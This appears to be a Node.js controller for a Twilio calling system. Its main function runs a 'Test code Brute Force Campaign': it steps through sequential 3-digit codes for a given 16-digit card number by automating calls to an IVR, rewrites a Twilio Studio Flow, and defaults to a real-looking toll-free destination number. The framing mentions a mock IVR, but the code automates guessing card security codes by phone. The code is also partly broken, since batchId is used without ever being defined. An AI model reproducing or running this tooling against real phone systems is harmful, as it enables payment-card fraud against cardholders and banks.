import twilio from 'twilio';
import * as AttemptModel from '../models/attemptModel.js';
import * as PhoneLineModel from '../models/phoneLineModel.js';
import * as OrchestratorService from '../services/orchestratorService.js';
import { supabase } from '../config/db.js';
import fs from 'fs';

// We will initialize Twilio client dynamically to avoid ESM dotenv hoisting issues

// Get dashboard status
export const getDashboardStatus = async (req, res) => {
  try {
    const lines = await PhoneLineModel.getAllPhoneLines();
    const attempts = await AttemptModel.getAttempts();
    const campaignRunning = OrchestratorService.isRunning();

    // Augment busy lines with the target number they are currently calling
    lines.forEach(line => {
      if (line.status === 'busy' && line.current_attempt_id) {
        const activeAttempt = attempts.find(a => a.id === line.current_attempt_id);
        if (activeAttempt) {
          line.target_phone_number = activeAttempt.target_phone_number;
        }
      }
    });

    return res.status(200).json({ lines, attempts, campaignRunning });
  } catch (error) {
    console.error('Error fetching dashboard status:', error);
    return res.status(500).json({ error: error.message });
  }
};

// Initialize a phone line
export const addPhoneLine = async (req, res) => {
  const { phoneNumber, maxAttempts } = req.body;

  // Security: Validate phone number format (E.164)
  if (!phoneNumber || !/^\+?[1-9]\d{1,14}$/.test(phoneNumber)) {
    return res.status(400).json({ error: 'Invalid E.164 phone number format.' });
  }

  try {
    const line = await PhoneLineModel.addPhoneLine(phoneNumber, maxAttempts);
    return res.status(200).json({ message: 'Phone line added/updated', line });
  } catch (error) {
    return res.status(500).json({ error: error.message });
  }
};



// Start Single-Call Test code Brute Force Campaign
export const startTestCodeBruteForce = async (req, res) => {
  let debugLog = `[${new Date().toISOString()}] ================ STARTING TEST CALL ===============\n`;
  const { phoneNumberId, sixteenDigit, toPhoneNumber, maxRetries } = req.body;
  try {
    const targetCard = sixteenDigit || '4520340092380255';
    let assignedTargetCode = null;

    try {
      const { data: existingConfig } = await supabase
        .from('mock_ivr_configs')
        .select('*')
        .limit(1)
        .maybeSingle();

      if (existingConfig && (existingConfig.sixteenDigit === targetCard || existingConfig.sixteen_digit === targetCard) && (existingConfig.testCode || existingConfig.test_code)) {
        assignedTargetCode = existingConfig.testCode || existingConfig.test_code;
      }
    } catch (e) {
      console.warn('mock_ivr_configs lookup warning:', e.message);
    }

    if (!assignedTargetCode) {
      try {
        const { data: existingCardAttempt } = await supabase
          .from('attempts')
          .select('target_test_code')
          .like('test_value', `${targetCard}:%`)
          .not('target_test_code', 'is', null)
          .limit(1)
          .maybeSingle();

        if (existingCardAttempt && existingCardAttempt.target_test_code) {
          assignedTargetCode = existingCardAttempt.target_test_code;
        }
      } catch (e) {
        console.warn('attempt lookup warning:', e.message);
      }
    }

    if (!assignedTargetCode) {
      try {
        const { data: allAttempts } = await supabase.from('attempts').select('target_test_code');
        const usedCodes = new Set();
        (allAttempts || []).forEach(a => { if (a.target_test_code) usedCodes.add(parseInt(a.target_test_code, 10)); });

        let codeCandidate = 1;
        while (usedCodes.has(codeCandidate)) {
          codeCandidate++;
        }
        assignedTargetCode = codeCandidate.toString().padStart(3, '0');
      } catch (e) {
        assignedTargetCode = '001';
      }
    }

    const randomTestCode = assignedTargetCode;
    debugLog += `Permanently assigned targetTestCode for ${targetCard}: ${randomTestCode}\n`;

    const accountSid = process.env.TWILIO_ACCOUNT_SID;
    const authToken = process.env.TWILIO_AUTH_TOKEN;
    const client = accountSid && authToken ? twilio(accountSid, authToken) : null;
    const studioFlowSid = process.env.TWILIO_STUDIO_FLOW_SID || 'FW0231a1a967dbc59016b2e1c5aef4d5a5';
    debugLog += `Client exists? ${!!client}, FlowSID: ${studioFlowSid}\n`;

    if (client && studioFlowSid) {
      try {
        const flowSid = studioFlowSid.replace(/\"/g, "").replace(/\'/g, "");
        const flow = await client.studio.v2.flows(flowSid).fetch();
        const definition = flow.definition;

        const setStateIndex = definition.states.findIndex(state => state.name === 'set_initial_vars');
        if (setStateIndex !== -1) {
          const variables = definition.states[setStateIndex].properties.variables;
          const sixteenDigitVar = variables.find(v => v.key === 'sixteen_digit_value');
          if (sixteenDigitVar) {
            sixteenDigitVar.value = sixteenDigit;
          }
          const testCodeVar = variables.find(v => v.key === 'expected_test_code');
          if (testCodeVar) {
            testCodeVar.value = randomTestCode;
          }

          await client.studio.v2.flows(flowSid).update({
            status: 'published',
            commitMessage: `Auto-updated for card ${sixteenDigit}`,
            definition: definition
          });
          debugLog += "Successfully updated Twilio Studio Flow definition!\n";
        } else {
          debugLog += "Could not find 'set_initial_vars' state.\n";
        }
      } catch (studioError) {
        debugLog += `Error updating Twilio Studio Flow: ${studioError.message}\n`;
      }
    } else {
      debugLog += "Skipping Twilio Studio update. Client or SID missing.\n";
    }

    fs.appendFileSync('update_log.txt', debugLog + '\n');

    let startCodeNum = parseInt(req.body.startCode) || 1;

    // Tiered sequential allocation per 16-digit card number (001-020, 021-040, etc.)
    const { data: existingAttempts } = await supabase
      .from('attempts')
      .select('test_value')
      .like('test_value', `${sixteenDigit}:%`);

    if (existingAttempts && existingAttempts.length > 0) {
      let maxCode = 0;
      existingAttempts.forEach(row => {
        if (row.test_value && row.test_value.includes(':')) {
          const code = parseInt(row.test_value.split(':')[1], 10);
          if (!isNaN(code) && code > maxCode) maxCode = code;
        }
      });
      if (maxCode > 0) {
        startCodeNum = maxCode + 1;
      }
    }

    const firstCodeStr = startCodeNum.toString().padStart(3, '0');
    const targets = [{
      phone_number: req.body.toPhoneNumber || '+18009838472',
      test_value: `${sixteenDigit}:${firstCodeStr}`,
      target_test_code: randomTestCode
    }];

    // Auto-configure the Test IVR via Supabase
    const { error: dbErr } = await supabase
      .from('mock_ivr_configs')
      .upsert({ id: 1, sixteenDigit: sixteenDigit, testCode: randomTestCode }, { onConflict: 'id' });
    if (dbErr) console.error('Failed to configure Test IVR:', dbErr);

    // Ensure no old/stuck queued attempts from previous runs get picked up
    await OrchestratorService.cancelPendingAttempts();

    await AttemptModel.createAttemptBatch(targets, batchId);
    OrchestratorService.startCampaign(phoneNumberId, maxRetries);

    return res.status(200).json({ message: 'Single-Call Test code Brute Force Campaign started.', batchId, targetCount: targets.length });
  } catch (error) {
    console.error('Error starting Test code campaign:', error);
    return res.status(500).json({ error: error.message });
  }
};

// Stop campaign
export const stopCampaign = async (req, res) => {
  try {
    OrchestratorService.stopCampaign();
    return res.status(200).json({ message: 'Campaign stopped successfully.' });
  } catch (error) {
    console.error('Error stopping campaign:', error);
    return res.status(500).json({ error: error.message });
  }
};

// Delete a phone line
export const deletePhoneLine = async (req, res) => {
  const { lineId } = req.params;
  try {
    await PhoneLineModel.deletePhoneLine(parseInt(lineId));
    return res.status(200).json({ message: 'Phone line deleted successfully.' });
  } catch (error) {
    console.error('Error deleting phone line:', error);
    return res.status(500).json({ error: error.message });
  }
};

// Edit/Update a phone line's phone number
export const updatePhoneLine = async (req, res) => {
  const { lineId } = req.params;
  const { phoneNumber } = req.body;

  if (!phoneNumber || !/^\+?[1-9]\d{1,14}$/.test(phoneNumber)) {
    return res.status(400).json({ error: 'Invalid E.164 phone number format.' });
  }

  try {
    const line = await PhoneLineModel.updatePhoneLine(parseInt(lineId), phoneNumber);
    return res.status(200).json({ message: 'Phone line updated successfully.', line });
  } catch (error) {
    console.error('Error updating phone line:', error);
    return res.status(500).json({ error: error.message });
  }
};
